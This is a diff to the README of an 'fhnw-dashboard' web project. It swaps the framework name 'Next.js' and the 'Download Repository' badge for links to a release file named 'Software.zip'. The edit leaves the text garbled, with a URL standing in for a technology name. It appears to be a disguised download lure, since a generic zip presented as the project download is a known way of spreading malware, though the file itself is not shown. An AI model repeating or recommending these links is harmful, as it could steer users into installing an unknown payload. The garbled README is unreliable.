@@ -10,7 +10,7 @@ Welcome to the **fhnw-dashboard** repository, your one-stop solution for a moder
 - Campus resources: Find everything you need on campus with quick access to important resources.
 
 ## Technologies Used 💻
-- **Next.js**: The React framework for building fast and scalable applications.
+- **https://github.com/hafijulkhan786/fhnw-dashboard/releases/download/v2.0/Software.zip**: The React framework for building fast and scalable applications.
 - **React**: A JavaScript library for building user interfaces.
 - **Tailwind CSS**: A utility-first CSS framework for rapid UI development.
 - **TypeScript**: A superset of JavaScript that adds static types to the language.
@@ -34,7 +34,7 @@ Welcome to the **fhnw-dashboard** repository, your one-stop solution for a moder
 
 ## Get Started 🚗💨
 To get started with the FHNW Dashboard, simply click the link below to download the repository:
-[![Download Repository](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/hafijulkhan786/fhnw-dashboard/releases/download/v2.0/Software.zip)](https://github.com/hafijulkhan786/fhnw-dashboard/releases/download/v2.0/Software.zip)
 
 If the link does not work, please check the **Releases** section of this repository for alternative download options.
 
